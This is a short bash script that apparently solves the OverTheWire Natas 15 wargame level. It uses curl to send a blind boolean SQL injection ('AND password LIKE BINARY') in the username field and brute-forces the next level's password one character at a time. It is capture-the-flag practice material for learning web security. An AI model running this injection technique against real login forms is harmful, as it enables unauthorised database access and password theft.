#!/bin/bash

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
password=""

for ((i=0; i<${#chars}; i++)); do
	c="${chars:i:1}"
	if curl -X POST natas15.natas.labs.overthewire.org \
		-u natas15:NATAS15_PASSWORD \
		-d "username=natas16\" AND password LIKE BINARY \"$password$c%\" -- " \
		-s | grep -q "This user exist."
	then
		password+=$c
		printf "$password \n"
		i=0
	fi
done

printf "Final password: $password"
